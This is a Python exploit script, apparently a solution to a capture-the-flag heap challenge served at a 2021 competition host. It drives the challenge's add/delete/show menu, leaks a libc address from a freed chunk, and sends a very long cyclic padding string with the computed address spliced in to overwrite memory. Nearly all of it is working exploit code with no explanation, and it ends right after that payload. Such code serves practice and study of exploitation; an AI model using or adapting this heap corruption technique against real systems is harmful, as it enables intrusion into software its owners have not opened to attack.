#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./chall')

host = args.HOST or 'compression.2021.ctfcompetition.com'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
def option(choice):
    sla("> ", str(choice))

def add(idx, size, data):
    print(f"allocating {idx} {size}")
    option(1)
    sla("> ", str(idx))
    sla("> ", str(size))
    sla("> ", data)

def delete(idx):
    option(2)
    sla("> ", str(idx))

def show(idx):
    option(3)
    sla("[Y/N]> ", "Y")
    sla("> ", str(idx))

io = start()
libc = ELF(exe.libc.path)
add(0, 0x800, "A"*8)
add(1, 0x7f, "A"*8)
delete(0)
show(0)
reu("Contents:")
libc.address = u64_bytes(6) - 0x1ebbe0
log.info(f"libc base : {hex(libc.address)}")
strchrnul = libc.address + 0x1eb010 + (8*1)
add(3, 0x4100, b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaampaaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaamyaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaaniaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaanraaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaaobaaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaaokaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaaotaaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaapdaaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaapmaaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaapvaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaqfaaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaqoaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaqxaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaarhaaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaarqaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaarzaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaasjaaaaaaskaaaaaaslaaaaaasmaaaaaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaassaaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaatcaaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaatlaaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaatuaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaaueaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaaaumaaaaaaunaaaaaauoaaaaaaupaaaaaauqaaaaaauraaaaaausaaaaaautaaaaaauuaaaaaauvaaaaaauwaaaaaauxaaaaaauyaaaaaauzaaaaaavbaaaaaavcaaaaaavdaaaaaaveaaaaaavfaaaaaavgaaaaaavhaaaaaaviaaaaaavjaaaaaavkaaaaaavlaaaaaavmaaaaaavnaaaaaavoaaaaaavpaaaaaavqaaaaaavraaaaaavsaaaaaavtaaaaaavuaaaaaavvaaaaaavwaaaaaavxaaaaaavyaaaaaavzaaaaaawbaaaaaawcaaaaaawdaaaaaaweaaaaaawfaaaaaawgaaaaaawhaaaaaawiaaaaaawjaaaaaawkaaaaaawlaaaaaawmaaaaaawnaaaaaawoaaaaaawpaaaaaawqaaaaaawraaaaaawsaaaaaawtaaaaaawuaaaaaawvaaaaaawwaaaaaawxaaaaaawyaaaaaawzaaaaaaxbaaaaaaxcaaaaaaxdaaaaaaxeaaaaaaxfaaaaaaxgaaaaaaxhaaaaaaxiaaaaaaxjaaaaaaxkaaaaaaxlaaaaaaxmaaaaaaxnaaaaaaxoaaaaaaxpaaaaaaxqaaaaaaxraaaaaaxsaaaaaaxtaaaaaaxuaaaaaaxvaaaaaaxwaaaaaaxxaaaaaaxyaaaaaaxzaaaaaaybaaaaaaycaaaaaaydaaaaaayeaaaaaayfaaaaaaygaaaaaayhaaaaaayiaaaaaayjaaaaaaykaaaaaaylaaaaaaymaaaaaaynaaaaaayoaaaaaaypaaaaaayqaaaaaayraaaaaaysaaaaaaytaaaaaayuaaaaaayvaaaaaaywaaaaaayxaaaaaayyaaaaaayzaaaaaazbaaaaaazcaaaaaazdaaaaaazeaaaaaazfaaaaaazgaaaaaazhaaaaaaziaaaaaazjaaaaaazkaaaaaazlaaaaaazmaaaaaaznaaaaaazoaaaaaazpaaaaaazqaaaaaazraaaaaazsaaaaaaztaaaaaazuaaaaaazvaaaaaazwaaaaaazxaaaaaazyaaaaaazzaaaaababaaaaabacaaaaabadaaaaabaeaaaaabafaaaaabagaaaaabahaaaaabaiaaaaabajaaaaabakaaaaabalaaaaabamaaaaabanaaaaabaoaaaaabapaaaaabaqaaaaabaraaaaabasaaaaabataaaaabauaaaaabavaaaaabawaaaaabaxaaaaabayaaaaabazaaaaabbbaaaaabbcaaaaabbdaaaaabbeaaaaabbfaaaaabbgaaaaabbhaaaaabbiaaaaabbjaaaaabbkaaaaabblaaaaabbmaaaaabbnaaaaabboaaaaabbpaaaaabbqaaaaabbraaaaabbsaaaaabbtaaaaabbuaaaaabbvaaaaabbwaaaaabbxaaaaabbyaaaaabbzaaaaabcbaaaaabccaaaaabcdaaaaabceaaaaabcfaaaaabcgaaaaabchaaaaabciaaaaabcjaaaaabckaaaaabclaaaaabcmaaaaabcnaaaaabcoaaaaabcpaaaaabcqaaaaabcraaaaabcsaaaaabctaaaaabcuaaaaabcvaaaaabcwaaaaabcxaaaaabcyaaaaabczaaaaabdbaaaaabdcaaaaabddaaaaabdeaaaaabdfaaaaabdgaaaaabdhaaaaabdiaaaaabdjaaaaabdkaaaaabdlaaaaabdmaaaaabdnaaaaabdoaaaaabdpaaaaabdqaaaaabdraaaaabdsaaaaabdtaaaaabduaaaaabdvaaaaabdwaaaaabdxaaaaabdyaaaaabdzaaaaabebaaaaabecaaaaabedaaaaabeeaaaaabefaaaaabegaaaaabehaaaaabeiaaaaabejaaaaabekaaaaabelaaaaabemaaaaabenaaaaabeoaaaaabepaaaaabeqaaaaaberaaaaabesaaaaabetaaaaabeuaaaaabevaaaaabewaaaaabexaaaaabeyaaaaabezaaaaabfbaaaaabfcaaaaabfdaaaaabfeaaaaabffaaaaabfgaaaaabfhaaaaabfiaaaaabfjaaaaabfkaaaaabflaaaaabfmaaaaabfnaaaaabfoaaaaabfpaaaaabfqaaaaabfraaaaabfsaaaaabftaaaaabfuaaaaabfvaaaaabfwaaaaabfxaaaaabfyaaaaabfzaaaaabgbaaaaabgcaaaaabgdaaaaabgeaaaaabgfaaaaabggaaaaabghaaaaabgiaaaaabgjaaaaabgkaaaaabglaaaaabgmaaaaabgnaaaaabgoaaaaabgpaaaaabgqaaaaabgraaaaabgsaaaaabgtaaaaabguaaaaabgvaaaaabgwaaaaabgxaaaaabgyaaaaabgzaaaaabhbaaaaabhcaaaaabhdaaaaabheaaaaabhfaaaaabhgaaaaabhhaaaaabhiaaaaabhjaaaaabhkaaaaabhlaaaaabhmaaaaabhnaaaaabhoaaaaabhpaaaaabhqaaaaabhraaaaabhsaaaaabhtaaaaabhuaaaaabhvaaaaabhwaaaaabhxaaaaabhyaaaaabhzaaaaabibaaaaabicaaaaabidaaaaabieaaaaabifaaaaabigaaaaabihaaaaabiiaaaaabijaaaaabikaaaaabilaaaaabimaaaaabinaaaaabioaaaaabipaaaaabiqaaaaabiraaaaabisaaaaabitaaaaabiuaaaaabivaaaaabiwaaaaabixaaaaabiyaaaaabizaaaaabjbaaaaabjcaaaaabjdaaaaabjeaaaaabjfaaaaabjgaaaaabjhaaaaabjiaaaaabjjaaaaabjkaaaaabjlaaaaabjmaaaaabjnaaaaabjoaaaaabjpaaaaabjqaaaaabjraaaaabjsaaaaabjtaaaaabjuaaaaabjvaaaaabjwaaaaabjxaaaaabjyaaaaabjzaaaaabkbaaaaabkcaaaaabkdaaaaabkeaaaaabkfaaaaabkgaaaaabkhaaaaabkiaaaaabkjaaaaabkkaaaaabklaaaaabkmaaaaabknaaaaabkoaaaaabkpaaaaabkqaaaaabkraaaaabksaaaaabktaaaaabkuaaaaabkvaaaaabkwaaaaabkxaaaaabkyaaaaabkzaaaaablbaaaaablcaaaaabldaaaaableaaaaablfaaaaablgaaaaablhaaaaabliaaaaabljaaaaablkaaaaabllaaaaablmaaaaablnaaaaabloaaaaablpaaaaablqaaaaablraaaaablsaaaaabltaaaaabluaaaaablvaaaaablwaaaaablxaaaaablyaaaaablzaaaaabmbaaaaabmcaaaaabmdaaaaabmeaaaaabmfaaaaabmgaaaaabmhaaaaabmiaaaaabmjaaaaabmkaaaaabmlaaaaabmmaaaaabmnaaaaabmoaaaaabmpaaaaabmqaaaaabmraaaaabmsaaaaabmtaaaaabmuaaaaabmvaaaaabmwaaaaabmxaaaaabmyaaaaabmzaaaaabnbaaaaabncaaaaabndaaaaabneaaaaabnfaaaaabngaaaaabnhaaaaabniaaaaabnjaaaaabnkaaaaabnlaaaaabnmaaaaabnnaaaaabnoaaaaabnpaaaaabnqaaaaabnraaaaabnsaaaaabntaaaaabnuaaaaabnvaaaaabnwaaaaabnxaaaaabnyaaaaabnzaaaaabobaaaaabocaaaaabodaaaaaboeaaaaabofaaaaabogaaaaabohaaaaaboiaaaaabojaaaaabokaaaaabolaaaaabomaaaaabonaaaaabooaaaaabopaaaaaboqaaaaaboraaaaabosaaaaabotaaaaabouaaaaabovaaaaabowaaaaaboxaaaaaboyaaaaabozaaaaabpbaaaaabpcaaaaabpdaaaaabpeaaaaabpfaaaaabpgaaaaabphaaaaabpiaaaaabpjaaaaabpkaaaaabplaaaaabpmaaaaabpnaaaaabpoaaaaabppaaaaabpqaaaaabpraaaaabpsaaaaabptaaaaabpuaaaaabpvaaaaabpwaaaaabpxaaaaabpyaaaaabpzaaaaabqbaaaaabqcaaaaabqdaaaaabqeaaaaabqfaaaaabqgaaaaabqhaaaaabqiaaaaabqjaaaaabqkaaaaabqlaaaaabqmaaaaabqnaaaaabqoaaaaabqpaaaaabqqaaaaabqraaaaabqsaaaaabqtaaaaabquaaaaabqvaaaaabqwaaaaabqxaaaaabqyaaaaabqzaaaaabrbaaaaabrcaaaaabrdaaaaabreaaaaabrfaaaaabrgaaaaabrhaaaaabriaaaaabrjaaaaabrkaaaaabrlaaaaabrmaaaaabrnaaaaabroaaaaabrpaaaaabrqaaaaabrraaaaabrsaaaaabrtaaaaabruaaaaabrvaaaaabrwaaaaabrxaaaaabryaaaaabrzaaaaabsbaaaaabscaaaaabsdaaaaabseaaaaabsfaaaaabsgaaaaabshaaaaabsiaaaaabsjaaaaabskaaaaabslaaaaabsmaaaaabsnaaaaabsoaaaaabspaaaaabsqaaaaabsraaaaabssaaaaabstaaaaabsuaaaaabsvaaaaabswaaaaabsxaaaaabsyaaaaabszaaaaabtbaaaaabtcaaaaabtdaaaaabteaaaaabtfaaaaabtgaaaaabthaaaaabtiaaaaabtjaaaaabtkaaaaabtlaaaaabtmaaaaabtnaaaaabtoaaaaabtpaaaaabtqaaaaabtraaaaabtsaaaaabttaaaaabtuaaaaabtvaaaaabtwaaaaabtxaaaaabtyaaaaabtzaaaaabubaaaaabucaaaaabudaaaaabueaaaaabufaaaaabugaaaaabuhaaaaabuiaaaaabujaaaaabukaaaaabulaaaaabumaaaaabunaaaaabuoaaaaabupaaaaabuqaaaaaburaaaaabusaaaaabutaaaaabuuaaaaabuvaaaaabuwaaaaabuxaaaaabuyaaaaabuzaaaaabvbaaaaabvcaaaaabvdaaaaabveaaaaabvfaaaaabvgaaaaabvhaaaaabviaaaaabvjaaaaabvkaaaaabvlaaaaabvmaaaaabvnaaaaabvoaaaaabvpaaaaabvqaaaaabvraaaaabvsaaaaabvtaaaaabvuaaaaabvvaaaaabvwaaaaabvxaaaaabvyaaaaabvzaaaaabwbaaaaabwcaaaaabwdaaaaabweaaaaabwfaaaaabwgaaaaabwhaaaaabwiaaaaabwjaaaaabwkaaaaabwlaaaaabwmaaaaabwnaaaaabwoaaaaabwpaaaaabwqaaaaabwraaaaabwsaaaaabwtaaaaabwuaaaaabwvaaaaabwwaaaaabwxaaaaabwyaaaaabwzaaaaabxbaaaaabxcaaaaabxdaaaaabxeaaaaabxfaaaaabxgaaaaabxhaaaaabxiaaaaabxjaaaaabxkaaaaabxlaaaaabxmaaaaabxnaaaaabxoaaaaabxpaaaaabxqaaaaabxraaaaabxsaaaaabxtaaaaabxuaaaaabxvaaaaabxwaaaaabxxaaaaabxyaaaaabxzaaaaabybaaaaabycaaaaabydaaaaabyeaaaaabyfaaaaabygaaaaabyhaaaaabyiaaaaabyjaaaaabykaaaaabylaaaaabymaaaaabynaaaaabyoaaaaabypaaaaabyqaaaaabyraaaaabysaaaaabytaaaaabyuaaaaabyvaaaaabywaaaaabyxaaaaabyyaaaaabyzaaaaabzbaaaaabzcaaaaabzdaaaaabzeaaaaabzfaaaaabzgaaaaabzhaaaaabziaaaaabzjaaaaabzkaaaaabzlaaaaabzmaaaaabznaaaaabzoaaaaabzpaaaaabzqaaaaabzraaaaabzsaaaaabztaaaaabzuaaaaabzvaaaaabzwaaaaabzxaaaaabzyaaaaabzzaaaaacabaaaaacacaaaaacadaaaaacaeaaaaacafaaaaacagaaaaacahaaaaacaiaaaaacajaaaaacakaaaaacalaaaaacamaaaaacanaaaaacaoaaaaacapaaaaacaqaaaaacaraaaaacasaaaaacataaaaacauaaaaacavaaaaacawaaaaacaxaaaaacayaaaaacazaaaaacbbaaaaacbcaaaaacbdaaaaacbeaaaaacbfaaaaacbgaaaaacbhaaaaacbiaaaaacbjaaaaacbkaaaaacblaaaaacbmaaaaacbnaaaaacboaaaaacbpaaaaacbqaaaaacbraaaaacbsaaaaacbtaaaaacbuaaaaacbvaaaaacbwaaaaacbxaaaaacbyaaaaacbzaaaaaccbaaaaacccaaaaaccdaaaaacceaaaaaccfaaaaaccgaaaaacchaaaaacciaaaaaccjaaaaacckaaaaacclaaaaaccmaaaaaccnaaaaaccoaaaaaccpaaaaaccqaaaaaccraaaaaccsaaaaacctaaaaaccuaaaaaccvaaaaaccwaaaaaccxaaaaaccyaaaaacczaaaaacdbaaaaacdcaaaaacddaaaaacdeaaaaacdfaaaaacdgaaaaacdhaaaaacdiaaaaacdjaaaaacdkaaaaacdlaaaaacdmaaaaacdnaaaaacdoaaaaacdpaaaaacdqaaaaacdraaaaacdsaaaaacdtaaaaacduaaaaacdvaaaaacdwaaaaacdxaaaaacdyaaaaacdzaaaaacebaaaaacecaaaaacedaaaaaceeaaaaacefaaaaacegaaaaacehaaaaaceiaaaaacejaaaaacekaaaaacelaaaaacemaaaaacenaaaaaceoaaaaacepaaaaaceqaaaaaceraaaaacesaaaaacetaaaaaceuaaaaacevaaaaacewaaaaacexaaaaaceyaaaaacezaaaaacfbaaaaacfcaaaaacfdaaaaacfeaaaaacffaaaaacfgaaaaacfhaaaaacfiaaaaacfjaaaaacfkaaaaacflaaaaacfmaaaaacfnaaaaacfoaaaaacfpaaaaacfqaaaaacfraaaaacfsaaaaacftaaaaacfuaaaaacfvaaaaacfwaaaaacfxaaaaacfyaaaaacfzaaaaacgbaaaaacgcaaaaacgdaaaaacgeaaaaacgfaaaaacggaaaaacghaaaaacgiaaaaacgjaaaaacgkaaaaacglaaaaacgmaaaaacgnaaaaacgoaaaaacgpaaaaacgqaaaaacgraaaaacgsaaaaacgtaaaaacguaaaaacgvaaaaacgwaaaaacgxaaaaacgyaaaaacgzaaaaachbaaaaachcaaaaachdaaaaacheaaaaachfaaaaachgaaaaachhaaaaachiaaaaachjaaaaachkaaaaachlaaaaachmaaaaachnaaaaachoaaaaachpaaaaachqaaaaachraaaaachsaaaaachtaaaaachuaaaaachvaaaaachwaaaaachxaaaaachyaaaaachzaaaaacibaaaaacicaaaaacidaaaaacieaaaaacifaaaaacigaaaaacihaaaaaciiaaaaacijaaaaacikaaaaacilaaaaacimaaaaacinaaaaacioaaaaacipaaaaaciqaaaaaciraaaaacisaaaaacitaaaaaciuaaaaacivaaaaaci" + p64(strchrnul)*2 + b"yaaaaacizaaaaacjbaaaaacjcaaaaacjdaaaaacjeaaaaacjfaaaaacjgaaaaacjhaaaaacjiaaaaacjjaaaaacjkaaaaacjlaaaaacjmaaaaacjnaaaaacjoaaaaacjpaaaaacjqaaaaacjraaaaacjsaaaaacjtaaaaacjuaaaaacjvaaaaacjwaaaaacjxaaaaacjyaaaaacjzaaaaackbaaaaackcaaaaackdaaaaackeaaaaackfaaaaackgaaaaackhaaaaackiaaaaackjaaaaackkaaaaacklaaaaackmaaaaacknaaaaackoaaaaackpaaaaackqaaaaackraaaaacksaaaaacktaaaaackuaaaaackvaaaaackwaaaaackxaaaaackyaaaaackzaaaaaclbaaaaaclcaaaaacldaaaaacleaaaaaclfaaaaaclgaaaaaclhaaaaacliaaaaacljaaaaaclkaaaaacllaaaaaclmaaaaaclnaaaaacloaaaaaclpaaaaaclqaaaaaclraaaaaclsaaaaacltaaaaacluaaaaaclvaaaaaclwaaaaaclxaaaaaclyaaaaaclzaaaaacmbaaaaacmcaaaaacmdaaaaacmeaaaaacmfaaaaacmgaaaaacmhaaaaacmiaaaaacmjaaaaacmkaaaaacmlaaaaacmmaaaaacmnaaaaacmoaaaaacmpaaaaacmqaaaaacmraaaaacmsaaaaacmtaaaaacmuaaaaacmvaaaaacmwaaaaacmxaaaaacmyaaaaacmzaaaaacnbaaaaacncaaaaacndaaaaacneaaaaacnfaaaaacngaaaaacnhaaaaacniaaaaacnjaaaaacnkaaaaacnlaaaaacnmaaaaacnnaaaaacnoaaaaacnpaaaaacnqaaaaacnraaaaacnsaaaaacntaaaaacnuaaaaacnvaaaaacnwaaaaacnxaaaaacnyaaaaacnzaaaaacobaaaaacocaaaaacodaaaaacoeaaaaacofaaaaacogaaaaacohaaaaacoiaaaaacojaaaaacokaaaaacolaaaaacomaaaaaconaaaaacooaaaaacopaaaaacoqaaaaacoraaaaacosaaaaacotaaaaacouaaaaacovaaaaacowaaaaacoxaaaaacoyaaaaacozaaaaacpbaaaaacpcaaaaacpdaaaaacpeaaaaacpfaaaaacpgaaaaacphaaaaacpiaaaaacpjaaaaacpkaaaaacplaaaaacpmaaaaacpnaaaaacpoaaaaacppaaaaacpqaaaaacpraaaaacpsaaaaacptaaaaacpuaaaaacpvaaaaacpwaaaaacpxaaaaacpyaaaaacpzaaaaacqbaaaaacqcaaaaacqdaaaaacqeaaaaacqfaaaaacqgaaaaacqhaaaaacqiaaaaacqjaaaaacqkaaaaacqlaaaaacqmaaaaacqnaaaaacqoaaaaacqpaaaaacqqaaaaacqraaaaacqsaaaaacqtaaaaacquaaaaacqvaaaaacqwaaaaacqxaaaaacqyaaaaacqzaaaaacrbaaaaacrcaaaaacrdaaaaacreaaaaacrfaaaaacrgaaaaacrhaaaaacriaaaaacrjaaaaacrkaaaaacrlaaaaacrmaaaaacrnaaaaacroaaaaacrpaaaaacrqaaaaacrraaaaacrsaaaaacrtaaaaacruaaaaacrvaaaaacrwaaaaacrxaaaaacryaaaaacrzaaaaacsbaaaaacscaaaaacsdaaaaacseaaaaacsfaaaaacsgaaaaacshaaaaacsiaaaaacsjaaaaacskaaaaacslaaaaacsmaaaaacsnaaaaacsoaaaaacspaaaaacsqaaaaacsraaaaacssaaaaacstaaaaacsuaaaaacsvaaaaacswaaaaacsxaaaaacsyaaaaacszaaaaactbaaaaactcaaaaactdaaaaacteaaaaactfaaaaactgaaaaacthaaaaactiaaaaactjaaaaactkaaaaactlaaaaactmaaaaactnaaaaactoaaaaactpaaaaactqaaaaactraaaaactsaaaaacttaaaaactuaaaaactvaaaaactwaaaaactxaaaaactyaaaaactzaaaaacubaaaaacucaaaaacudaaaaacueaaaaacufaaaaacugaaaaacuhaaaaacuiaaaaacujaaaaacukaaaaaculaaaaacumaaaaacunaaaaacuoaaaaacupaaaaacuqaaaaacuraaaaacusaaaaacutaaaaacuuaaaaacuvaaaaacuwaaaaacuxaaaaacuyaaaaacuzaaaaacvbaaaaacvcaaaaacvdaaaaacveaaaaacvfaaaaacvgaaaaacvhaaaaacviaaaaacvjaaaaacvkaaaaacvlaaaaacvmaaaaacvnaaaaacvoaaaaacvpaaaaacvqaaaaacvraaaaacvsaaaaacvtaaaaacvuaaaaacvvaaaaacvwaaaaacvxaaaaacvyaaaaacvzaaaaacwbaaaaacwcaaaaacwdaaaaacweaaaaacwfaaaaacwgaaaaacwhaaaaacwiaaaaacwjaaaaacwkaaaaacwlaaaaacwmaaaaacwnaaaaacwoaaaaacwpaaaaacwqaaaaacwraaaaacwsaaaaacwtaaaaacwuaaaaacwvaaaaacwwaaaaacwxaaaaacwyaaaaacwzaaaaacxbaaaaacxcaaaaacxdaaaaacxeaaaaacxfaaaaacxgaaaaacxhaaaaacxiaaaaacxjaaaaacxkaaaaacxlaaaaacxmaaaaacxnaaaaacxoaaaaacxpaaaaacxqaaaaacxraaaaacxsaaaaacxtaaaaacxuaaaaacxvaaaaacxwaaaaacxxaaaaacxyaaaaacxzaaaaacybaaaaacycaaaaacydaaaaacyeaaaaacyfaaaaacygaaaaacyhaaaaacyiaaaaacyjaaaaacykaaaaacylaaaaacymaaaaacynaaaaacyoaaaaacypaaaaacyqaaaaacyraaaaacysaaaaacytaaaaacyuaaaaacyvaaaaacywaaaaacyxaaaaacyyaaaaacyzaaaaaczbaaaaaczcaaaaaczdaaaaaczeaaaaaczfaaaaaczgaaaaaczhaaaaacziaaaaaczjaaaaaczkaaaaaczlaaaaaczmaaaaacznaaaaaczoaaaaaczpaaaaaczqaaaaaczraaaaaczsaaaaacztaaaaaczuaaaaaczvaaaaaczwaaaaaczxaaaaaczyaaaaaczzaaaaadabaaaaadacaaaaadadaaaaadaeaaaaadafaaaaadagaaaaadahaaaaadaiaaaaadajaaaaadakaaaaadalaaaaadamaaaaadanaaaaadaoaaaaadapaaaaadaqaaaaadaraaaaadasaaaaadataaaaadauaaaaadavaaaaadawaaaaadaxaaaaadayaaaaadazaaaaadbbaaaaadbcaaaaadbdaaaaadbeaaaaadbfaaaaadbgaaaaadbhaaaaadbiaaaaadbjaaaaadbkaaaaadblaaaaadbmaaaaadbnaaaaadboaaaaadbpaaaaadbqaaaaadbraaaaadbsaaaaadbtaaaaadbuaaaaadbvaaaaadbwaaaaadbxaaaaadbyaaaaadbzaaaaadcbaaaaadccaaaaadcdaaaaadceaaaaadcfaaaaadcgaaaaadchaaaaadciaaaaadcjaaaaadckaaaaadclaaaaadcmaaaaadcnaaaaadcoaaaaadcpaaaaadcqaaaaadcraaaaadcsaaaaadctaaaaadcuaaaaadcvaaaaadcwaaaaadcxaaaaadcyaaaaadczaaaaaddbaaaaaddcaaaaadddaaaaaddeaaaaaddfaaaaaddgaaaaaddhaaaaaddiaaaaaddjaaaaadd" + p64(strchrnul) + b"laaaaaddmaaaaaddnaaaaaddoaaaaaddpaaaaaddqaaaaaddraaaaaddsaaaaaddtaaaaadduaaaaaddvaaaaaddwaaaaaddxaaaaaddyaaaaaddzaaaaadebaaaaadecaaaaadedaaaaadeeaaaaadefaaaaadegaaaaadehaaaaadeiaaaaadejaaaaadekaaaaadelaaaaademaaaaadenaaaaadeoaaaaadepaaaaadeqaaaaaderaaaaadesaaaaadetaaaaadeuaaaaadevaaaaadewaaaaadexaaaaadeyaaaaadezaaaaadfbaaaaadfcaaaaadfdaaaaadfeaaaaadf")
